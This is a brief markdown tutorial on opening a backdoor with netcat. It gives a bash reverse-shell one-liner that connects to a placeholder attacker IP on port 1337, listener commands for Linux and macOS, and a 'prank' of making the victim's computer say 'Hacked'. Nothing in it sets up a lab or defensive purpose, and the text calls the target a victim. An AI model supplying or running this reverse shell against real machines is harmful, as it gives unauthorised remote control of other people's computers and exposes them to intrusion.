# How to netcat (or a little backdoor)

Create the reverse shell in the port 1337:

```bash
$ sh -i >& /dev/tcp/ATTACKERS_IP/1337 0>&1
```

Now just netcat to it. From a Linux machine:

```bash
$ nc -l -p 1337
```

Or from a Macbook:
```bash
$ nc -l 1337
```

You should get shell. A cute prank is making the victim's computer talk:

```bash
$ say Hacked
```
